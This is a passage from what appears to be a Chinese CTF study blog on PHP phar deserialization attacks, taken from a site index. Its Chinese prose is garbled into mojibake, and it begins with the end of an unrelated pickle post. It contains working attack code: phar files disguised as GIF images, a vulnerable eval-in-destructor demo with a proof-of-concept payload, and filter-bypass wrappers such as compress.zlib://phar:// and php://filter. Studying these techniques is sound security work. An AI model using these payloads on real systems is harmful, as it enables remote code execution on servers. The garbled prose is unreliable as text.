å…¶ä»–æ–¹æ³•å¯ä¹Ÿå‚è€ƒï¼šhttps://xz.aliyun.com/t/7320 æ€»çš„æ¥è¯´ï¼Œå­¦pharååºåˆ—åŒ–ä»»é‡è€Œé“è¿œï¼Œè™½ç„¶æ€»ç»“äº†è¿™ä¹ˆå¤šï¼Œä½†æ¶ˆåŒ–çš„æ„Ÿè§‰æŒºå°‘ï¼Œä»¥åä¼šå¤šæ‰¾ç‚¹è¿™ç§é¢˜ç›®çš„ï¼Œç»§ç»­æ›´æ–°è¿™ç¯‡æ–‡ç« ï¼ˆæ¯•ç«Ÿè´¨é‡å¤ªè¾£é¸¡ï¼‰ 0x09 å‚è€ƒæ–‡ç«  pickleååºåˆ—åŒ–åˆæ¢ Pythonååºåˆ—åŒ–æ¼æ´åˆ†æ æœ€è¿‘ç¢°åˆ°çš„ Python pickle ååºåˆ—åŒ–å°æ€»ç»“ â€“ pickle passå¯å‚è€ƒ Pickleååºåˆ—åŒ– åˆ©ç”¨pythonååºåˆ—åŒ–è¦†ç›–ç§˜é’¥â€”â€”watevrCTF-2019:Pickle Storeçš„ç¬¬äºŒç§è§£æ³•","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"Pharååºåˆ—åŒ–","path":"/2023/11/13/phar-fan-xu-lie-hua-xue-xi/","content":"0x01 å‰è¨€ è¿™é‡Œä¾æ—§æ˜¯æ‰“æ¯”èµ›çš„æ—¶å€™ï¼Œé‡åˆ°äº†å¤šæ¬¡pharååºåˆ—åŒ–çŸ¥è¯†ï¼Œè™½ç„¶æ­¤å‰äº†è§£è¿‡ï¼Œä½†æ„Ÿè§‰å­¦çš„ä¸å¤Ÿæ·±åˆ»ï¼Œå€Ÿæ­¤æ¥å¢è¿›ä¸€ä¸‹è®°å¿†ï¼Œé¡ºä¾¿çœ‹çœ‹èƒ½è¿›é˜¶åˆ°å“ªé‡Œã€‚ æœ¬æ–‡è´¨é‡ä¸é«˜ï¼Œæˆ‘çº¯åƒåœ¾ï¼Œåªä¸ºè®©è‡ªå·±å­¦æ‡‚ï¼Œè§è°…ï¼ 0x02 åŸç†åˆ†æ çœ‹åˆ°ä¸€ä½å¸ˆå‚…è¯´pharååºåˆ—åŒ–ï¼Œå¤šå‡ºç°åœ¨tpæ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œè¿™ä¼¼ä¹åˆåœ¨æš—ç¤ºæˆ‘ï¼Œå¾—å­¦ä¹ ä¸€æ³¢tpäº†ï¼ å…³äºè¿™ä¸ªæ–¹æ³•åœ¨å»å¹´ BlackHat å¤§ä¼šä¸Šçš„ Sam Thomas åˆ†äº«äº† File Operation Induced Unserialization via the â€œphar://â€ Stream Wrapper ï¼Œè¯¥ç ”ç©¶å‘˜æŒ‡å‡ºè¯¥æ–¹æ³•åœ¨ æ–‡ä»¶ç³»ç»Ÿå‡½æ•° ï¼ˆ file_get_contents ã€ unlink ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ phar://ä¼ªåè®® ï¼Œå¯ä»¥ä¸ä¾èµ–ååºåˆ—åŒ–å‡½æ•° unserialize() ç›´æ¥è¿›è¡Œååºåˆ—åŒ–çš„æ“ä½œã€‚ 2.1 pharæ–‡ä»¶åˆ†æ åœ¨äº†è§£åŸç†ä¹‹å‰ï¼ŒæŸ¥è¯¢äº†ä¸€ä¸‹å®˜æ–¹æ‰‹å†Œï¼Œæ‰‹å†Œé‡Œé’ˆå¯¹ phar:// è¿™ä¸ªä¼ªåè®®æ˜¯è¿™æ ·ä»‹ç»çš„ã€‚ Pharå½’æ¡£æ–‡ä»¶æœ€æœ‰ç‰¹è‰²çš„ç‰¹ç‚¹æ˜¯å¯ä»¥æ–¹ä¾¿åœ°å°†å¤šä¸ªæ–‡ä»¶åˆ†ç»„ä¸ºä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·ï¼Œpharå½’æ¡£æ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPåº”ç”¨ç¨‹åºåˆ†å‘åˆ°å•ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶è¿è¡Œå®ƒçš„æ–¹æ³•ï¼Œè€Œæ— éœ€å°†å…¶æå–åˆ°ç£ç›˜ä¸­ã€‚æ­¤å¤–ï¼ŒPHPå¯ä»¥åƒåœ¨å‘½ä»¤è¡Œä¸Šå’Œä»WebæœåŠ¡å™¨ä¸Šçš„ä»»ä½•å…¶ä»–æ–‡ä»¶ä¸€æ ·è½»æ¾åœ°æ‰§è¡Œpharå­˜æ¡£ã€‚ Pharæœ‰ç‚¹åƒPHPåº”ç”¨ç¨‹åºçš„æ‹‡æŒ‡é©±åŠ¨å™¨ã€‚ï¼ˆè¯‘æ–‡ï¼‰ ç®€å•ç†è§£ phar:// å°±æ˜¯ä¸€ä¸ªç±»ä¼¼ file:// çš„æµåŒ…è£…å™¨ï¼Œå®ƒçš„ä½œç”¨å¯ä»¥ä½¿å¾—å¤šä¸ªæ–‡ä»¶å½’æ¡£åˆ°ç»Ÿä¸€æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨ä¸ç»è¿‡è§£å‹çš„æƒ…å†µä¸‹è¢«phpæ‰€è®¿é—®ï¼Œå¹¶ä¸”æ‰§è¡Œã€‚ ä¸‹é¢çœ‹ä¸€ä¸‹pharæ–‡ä»¶çš„ç»“æ„ï¼šå¤§ä½“æ¥è¯´ Phar ç»“æ„ç”±4éƒ¨åˆ†ç»„æˆ 1.stub ï¼špharæ–‡ä»¶æ ‡è¯† &lt;?php Phar::mapPhar(); include 'phar://phar.phar/index.php'; __HALT_COMPILER(); ?&gt; å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx&lt;?php xxx; __HALT_COMPILER();?&gt;ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ç•™ä¸‹è¿™ä¸ªæ ‡å¿—ä½ï¼Œæ„é€ ä¸€ä¸ªå›¾ç‰‡æˆ–è€…å…¶ä»–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Œå¹¶ä¸”è¢« phar å‡½æ•°è¯†åˆ«åˆ©ç”¨ã€‚ 2. a manifest describing the contents pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ 3. the file contents è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚ 4. [optional] a signature for verifying Phar integrity (phar file format only) ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š 2.2 demoæµ‹è¯• æ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œã€‚ æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚ ä½†çœ‹äº†å…¶ä»–çš„æ–‡ç« è¯´ï¼ŒåŒæ—¶è¦ä¿è¯PHPç‰ˆæœ¬&gt;5.3.0 phar_gen.php &lt;?php class TestObject { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $o = new TestObject(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; è¿™é‡Œå¯¹test.txté‚£ä¸€è¡Œä»£ç äº§ç”Ÿäº†ç–‘æƒ‘ï¼šä¸ºä½•è¦å­˜åœ¨è¿™ä¸€è¡Œä»£ç ï¼Ÿé—®äº†GPTï¼Œå›ç­”å¦‚ä¸‹ï¼š è¿™è¡Œä»£ç æ˜¯ä¸ºäº†åœ¨ PHAR æ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªç¤ºä¾‹æ–‡ä»¶ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ—¶å¯ä»¥ä» PHAR å½’æ¡£ä¸­æå–å’Œä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ã€‚ emmmæš‚æ—¶è¿˜æ˜¯ç†è§£ä¸ï¼Œå…ˆç»§ç»­å¾€ä¸‹å­¦å§ å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ï¼š æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š è¿™é‡Œçœ‹ç€ä½¬çœ‹èµ·äº†åº•å±‚ä»£ç å®ç°é€»è¾‘ï¼Œä½†ç›®å‰çš„æˆ‘è‚¯å®šçœ‹ä¸æ‡‚ï¼Œå› æ­¤è¿™é‡Œæˆ‘æŠ±ç€çœ‹æ‡‚å¤§æ¦‚ï¼Œè·Ÿç€çœ‹ç€å­¦çš„å¿ƒæ€äº†ã€‚ æ¥çœ‹ä¸€ä¸‹phpåº•å±‚ä»£ç æ˜¯å¦‚ä½•å¤„ç†çš„ï¼š php-src/ext/phar/phar.c çœ‹ä¸æ‡‚ï¼Œä½†èƒ½çŒœåˆ°ä¸Šè¿°ç®­å¤´å¤„æ˜¯å¯¹æˆ‘ä»¬pharæ–‡ä»¶ä¸­çš„metadataæ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚ è¿™é‡Œå€Ÿç”¨ä½¬çš„ä¾‹å­è¯æ˜äº†ï¼ˆä¸æƒ³è´¹æ—¶é—´å†™äº†ã€‚ã€‚ã€‚ phar_test1.php &lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/test.txt'; file_get_contents($filename); ?&gt; å…¶ä»–å‡½æ•°å½“ç„¶ä¹Ÿæ˜¯å¯è¡Œçš„ï¼š phar_test2.php &lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/a_random_string'; file_exists($filename); //...... ?&gt; å½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œä¸€äº›ä¹‹å‰çœ‹èµ·æ¥â€œäººç•œæ— å®³â€çš„å‡½æ•°ä¹Ÿå˜å¾—â€œæš— è—æ€æœºâ€ï¼Œæå¤§çš„æ‹“å±•äº†æ”»å‡»é¢ã€‚ 2.3 å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯__HALT_COMPILER();?&gt;è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚ &lt;?php class TestObject { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $o = new TestObject(); $o-&gt;data='hello hybcx!'; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªå‡è£…è‡ªå·±æ˜¯å›¾ç‰‡çš„pharæ–‡ä»¶æœ€åçš„æ•ˆæœã€‚ &lt;?php include('phar://phar.jpg'); class TestObject { function __destruct() { echo $this-&gt;data; } } ?&gt; æˆåŠŸååºåˆ—åŒ–è¯†åˆ«æ–‡ä»¶å†…å®¹ï¼Œé‡‡ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¼ æ£€æµ‹ã€‚ 2.4 è§¦å‘ååºåˆ—åŒ–çš„æ–‡ä»¶æ“ä½œå‡½æ•° æˆ‘ä»¬ç»§ç»­è·Ÿç€é‚£ä½å¸ˆå‚…å†æ¬¡åˆ†æä¸€æ³¢æ–‡ä»¶æ“ä½œå‡½æ•° å—å½±å“å‡½æ•°å¦‚ä¸‹ï¼š ä¸ºä»€ä¹ˆ Phar ä¼šååºåˆ—åŒ–å¤„ç†æ–‡ä»¶å¹¶ä¸”åœ¨æ–‡ä»¶æ“ä½œä¸­èƒ½å¤ŸæˆåŠŸååºåˆ—åŒ–å‘¢ï¼Ÿè¿™é‡Œéœ€è¦é€šè¿‡phpåº•å±‚ä»£ç æ‰èƒ½çŸ¥é“ï¼Œå…³äºè¿™ä¸ªé—®é¢˜ZSXå¸ˆå‚…çš„ Pharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜å·²ç»è¯¦ç»†åˆ†æäº†ã€‚è¿™é‡Œé€šè¿‡ä¸€ä¸ªdemoè®ºè¯ä¸€ä¸‹ä¸Šè¿°ç»“è®ºã€‚ä»ç„¶ä»¥ä¸Šé¢çš„pharæ–‡ä»¶ä¸ºä¾‹ &lt;?php class TestObject { public function __destruct() { echo $this-&gt;data; echo 'Destruct called'; } } $filename = 'phar://phar.phar/test.txt'; file_get_contents($filename); ?&gt; è¿™é‡Œå¯ä»¥çœ‹åˆ°å·²ç»ååºåˆ—åŒ–æˆåŠŸè§¦å‘__destructæ–¹æ³•å¹¶ä¸”è¯»å–äº†æ–‡ä»¶å†…å®¹ã€‚å…¶ä»–å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå°±ä¸ä¸€ä¸€è¯•äº†ï¼Œ å¦‚æœé¢˜ç›®é™åˆ¶äº†ï¼Œphar://ä¸èƒ½å‡ºç°åœ¨å¤´å‡ ä¸ªå­—ç¬¦ã€‚å¯ä»¥ç”¨Bzip / Gzipåè®®ç»•è¿‡ã€‚ $filename = 'compress.zlib://phar://phar.phar/test.txt'; è™½ç„¶ä¼šè­¦å‘Šä½†ä»ä¼šæ‰§è¡Œï¼Œå®ƒåŒæ ·é€‚ç”¨äºcompress.bzip2://ã€‚ å½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œæå¤§çš„æ‹“å±•äº†ååºåˆ—åŒ–æ”»å‡»é¢ã€‚ 2.5 è§¦å‘ååºåˆ—åŒ–ä¹‹æ“ä½œæ–‡ä»¶çš„touch è¿™é‡Œä¹Ÿæ˜¯ç›´æ¥å€Ÿç”¨å¸ˆå‚…ä»¬çš„æ€»ç»“äº†ï¼Œä»¥ä¸‹ä½¿ç”¨å‡æ˜¯ä½¬ä»¬ä»æºç å½“ä¸­åˆ†æå‡ºæ¥çš„ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥cväº†ã€‚ã€‚ã€‚ å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªå…±åŒç‰¹å¾ï¼Œå°±æ˜¯è°ƒç”¨äº†php_stream_locate_url_wrapperã€‚ä½†æ˜¯è¿™ä¸ªä¸é‚£ä¹ˆå¥½ç”¨ï¼Œæ¢php_stream_open_wrapperæ›´åˆé€‚ç‚¹ã€‚è®©æˆ‘ä»¬æœç´¢ä¸€ä¸‹PHPæºä»£ç å§ï¼Œ æˆ‘ä»¬å¾ˆå¿«å°±èƒ½å‘ç°ï¼Œæ“ä½œæ–‡ä»¶çš„touchï¼Œä¹Ÿæ˜¯èƒ½è§¦å‘å®ƒçš„ã€‚ä¸çœ‹æ–‡ä»¶äº†ï¼Œæˆ‘ä»¬å‡è®¾æ–‡ä»¶å…¨éƒ¨éƒ½èƒ½ç”¨ã€‚ exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstring zip $zip = new ZipArchive(); $res = $zip-&gt;open('c.zip'); $zip-&gt;extractTo('phar://test.phar/test'); 0x03 ä¸¾ä¾‹åˆ†æ 3.1 æœ¬åœ°æµ‹è¯• åˆ©ç”¨æ¡ä»¶. ä»»ä½•æ¼æ´æˆ–æ”»å‡»æ‰‹æ³•ä¸èƒ½å®é™…åˆ©ç”¨ï¼Œéƒ½æ˜¯çº¸ä¸Šè°ˆå…µã€‚åœ¨åˆ©ç”¨ä¹‹å‰ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹è¿™ç§æ”»å‡»çš„åˆ©ç”¨æ¡ä»¶ã€‚ 1.pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚ 2.å¦‚`file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile()`ç­‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸º\"è·³æ¿\"ã€‚ 3.æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:`:ã€/ã€phar`ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ è¿™é‡Œå…ˆç”¨smi1eå¸ˆå‚…çš„demoåšä¸ªä¾‹å­ã€‚ phpååºåˆ—åŒ–æ”»å‡»æ‹“å±• ä¾‹ä¸€ã€ upload_file.phpåç«¯æ£€æµ‹æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ç±»å‹æ˜¯å¦ä¸ºgifï¼Œæ–‡ä»¶åç¼€åæ˜¯å¦ä¸ºgif &lt;?php if (($_FILES[\"file\"][\"type\"]==\"image/gif\")&amp;&amp;(substr($_FILES[\"file\"][\"name\"], strrpos($_FILES[\"file\"][\"name\"], '.')+1))== 'gif') { echo \"Upload: \" . $_FILES[\"file\"][\"name\"]; echo \"Type: \" . $_FILES[\"file\"][\"type\"]; echo \"Temp file: \" . $_FILES[\"file\"][\"tmp_name\"]; if (file_exists(\"upload_file/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" already exists. \"; } else { move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload_file/\" .$_FILES[\"file\"][\"name\"]); echo \"Stored in: \" . \"upload_file/\" . $_FILES[\"file\"][\"name\"]; } } else { echo \"Invalid file,you can only upload gif\"; } upload_file.html &lt;html&gt; &lt;body&gt; &lt;form action=\"http://localhost/upload_file.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" name=\"Upload\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; un.phpå­˜åœ¨file_exists()ï¼Œå¹¶ä¸”å­˜åœ¨__destruct() &lt;?php highlight_file(__FILE__); $filename=@$_GET['filename']; echo 'please input a filename'.'&lt;br /&gt;'; class AnyClass{ var $output = 'echo \"ok\";'; function __destruct() { eval($this -&gt; output); } } if(file_exists($filename)){ $a = new AnyClass(); } else{ echo 'file is not exists'; } ?&gt; è¯¥demoç¯å¢ƒå­˜åœ¨ä¸¤ä¸ªç‚¹ï¼Œç¬¬ä¸€å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¸Šä¼ gifå›¾ï¼Œç¬¬äºŒå­˜åœ¨é­”æœ¯æ–¹æ³•__destruct()ä»¥åŠæ–‡ä»¶æ“ä½œå‡½æ•°file_exists()ï¼Œè€Œ ä¸”åœ¨AnyClassç±»ä¸­è°ƒç”¨äº†evalï¼Œä»¥æ­¤ç”¨æ¥å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬çŸ¥é“ä»¥ä¸Šæ¡ä»¶æ­£å¥½æ»¡è¶³åˆ©ç”¨æ¡ä»¶ã€‚ æ ¹æ®un.phpå†™ä¸€ä¸ªç”Ÿæˆpharçš„phpæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¤´åŠ ä¸ŠGIF89aç»•è¿‡gifï¼Œç„¶åæˆ‘ä»¬è®¿é—®è¿™ä¸ªphpæ–‡ä»¶åï¼Œç”Ÿæˆäº†phar.pharï¼Œä¿®æ”¹åç¼€ä¸º gifï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ©ç”¨file_existsï¼Œä½¿ç”¨phar://æ‰§è¡Œä»£ç  poc.php &lt;?php class AnyClass{ var $output = 'echo \"ok\";'; } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $o = new AnyClass(); $o-&gt;output='phpinfo();'; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; è¿™é‡Œæå®Œï¼Œå‘ç°é‚£ä½å¸ˆå‚…å°±å»åˆ†æäº†tp5.2ç‰ˆæœ¬çš„popé“¾å¯¹pharååºåˆ—åŒ–çš„åˆ©ç”¨ï¼Œç”±äºè¿™é‡Œæˆ‘æ²¡å­¦ä¹ tpæ¡†æ¶ï¼Œæš‚æ—¶ä¸æäº†ï¼Œåç»­å­¦äº†å†æ¥æ›´æ–° 3.2 å¯¼è‡´pharè§¦å‘çš„å…¶ä»–åœ°æ–¹(sql) Postgres &lt;?php $pdo = new PDO(sprintf(\"pgsql:host=%s;dbname=%s;user=%s;password=%s\", \"127.0.0.1\", \"test\", \"root\", \"root\")); @$pdo-&gt;pgsqlCopyFromFile('aa', 'phar://test.phar/aa'); å½“ç„¶ï¼ŒpgsqlCopyToFileå’Œpg_traceåŒæ ·ä¹Ÿæ˜¯èƒ½ä½¿ç”¨çš„ï¼Œåªæ˜¯å®ƒä»¬éœ€è¦å¼€å¯pharçš„å†™åŠŸèƒ½ã€‚ MySQL LOAD DATA LOCAL INFILEä¹Ÿä¼šè§¦å‘pharé€ æˆååºåˆ—åŒ–ï¼Œåœ¨ä»Šå¹´çš„TSec 2019 è®®é¢˜ PPTï¼šComprehensive analysis of the mysql client attack chainï¼Œä¸Šé¢è¯´çš„N1CTF2019 é¢˜ç›®sql_manageè€ƒçš„ä¹Ÿæ˜¯è¿™ä¸ªç‚¹ï¼Œæˆ‘ä»¬ä»ç„¶ä½¿ç”¨æœ€ä¸Šé¢é‚£ä¸ªä¾‹å­ã€‚ &lt;?php class TestObject { function __destruct() { echo $this-&gt;data; echo 'Destruct called'; } } // $filename = 'compress.zlib://phar://phar.phar/test.txt'; // file_get_contents($filename); $m = mysqli_init(); mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true); $s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'test', 3306); $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \\'phar://phar.phar/test.txt\\' INTO TABLE users LINES TERMINATED BY \\'\\r \\' IGNORE 1 LINES;'); ?&gt; å†é…ç½®ä¸€ä¸‹mysqldã€‚ [mysqld] local-infile=1 secure_file_priv=\"\" è¿™é‡Œç”±äºæˆ‘æ‡’å¾—é…ç½®mysqläº†ï¼Œå°±å€Ÿç”¨å¸ˆå‚…çš„å›¾å§ã€‚ã€‚ã€‚ å¯ä»¥çœ‹åˆ°mysqlè¿›è¡Œpharæ–‡ä»¶è¯»å–æ—¶æˆåŠŸè§¦å‘ååºåˆ—åŒ–ã€‚ 0x04 å®æˆ˜ä¾‹é¢˜ ç­‰é‡åˆ°çš„æ—¶å€™è¡¥å……å§ã€‚ã€‚ã€‚ 0x05 ç»•è¿‡æ€»ç»“ 5.1 pharå…³é”®è¯ç»•è¿‡ // Bzip / Gzip å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç»•è¿‡ compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///home/sx/test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt // è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®çš„æ–¹æ³•ç»•è¿‡ php://filter/read=convert.base64-encode/resource=phar://phar.phar 5.2 __HALT_COMPILERå…³é”®è¯ç»•è¿‡ if (preg_match(\"/&lt;/?|php|HALT_COMPILER/i\",$filename){ die(); } å› ä¸ºpharä¸­çš„a stubå­—æ®µå¿…é¡»ä»¥__HALT_COMPILER();å­—ç¬¦ä¸²æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™æ®µå­—ç¬¦ä¸²ä¸èƒ½çœç•¥ï¼Œåªèƒ½ç»•è¿‡ æ–¹æ³•ä¸€ï¼š é¦–å…ˆå°† phar æ–‡ä»¶ä½¿ç”¨ gzip å‘½ä»¤è¿›è¡Œå‹ç¼©ï¼Œå¯ä»¥çœ‹åˆ°å‹ç¼©ä¹‹åçš„æ–‡ä»¶ä¸­å°±æ²¡æœ‰äº†__HALT_COMPILER()ï¼Œå°† phar.gz åç¼€æ”¹ä¸º pngï¼ˆpngæ–‡ä»¶å¯ä»¥ä¸Šä¼ ï¼‰ æ–‡ä»¶ä¸Šä¼ æˆåŠŸåï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ–‡ä»¶ file_un.php?filename=phar://pic/phar.phar.gz/phar.phar # file_un.phpä¸­åŒ…å«__destructå¹¶ä¸”å¯ä»¥è¢«è§¦å‘ æ–¹æ³•äºŒï¼š å°†pharçš„å†…å®¹å†™è¿›å‹ç¼©åŒ…æ³¨é‡Šä¸­ï¼Œä¹ŸåŒæ ·èƒ½å¤Ÿååºåˆ—åŒ–æˆåŠŸï¼Œå‹ç¼©ä¸ºzipä¹Ÿä¼šç»•è¿‡è¯¥æ­£åˆ™ &lt;?php $phar_file = serialize($exp); echo $phar_file; $zip = new ZipArchive(); $res = $zip-&gt;open('1.zip',ZipArchive::CREATE); $zip-&gt;addFromString('crispr.txt', 'file content goes here'); $zip-&gt;setArchiveComment($phar_file); $zip-&gt;close(); ?&gt; è¿™ç¯‡æ–‡ç« åœ¨phpæºç 